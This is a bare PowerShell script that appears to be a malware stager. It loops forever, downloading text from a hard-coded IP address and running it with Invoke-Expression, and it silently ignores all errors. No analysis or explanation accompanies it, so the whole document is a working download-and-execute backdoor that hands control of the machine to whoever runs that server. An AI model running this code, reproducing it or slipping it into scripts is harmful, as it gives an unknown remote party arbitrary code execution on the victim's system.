$webClient = New-Object System.Net.WebClient
while($true){
try{
$r=$webClient.DownloadString('http://107.175.57.80/')
IEX $r;
}catch{
}
}
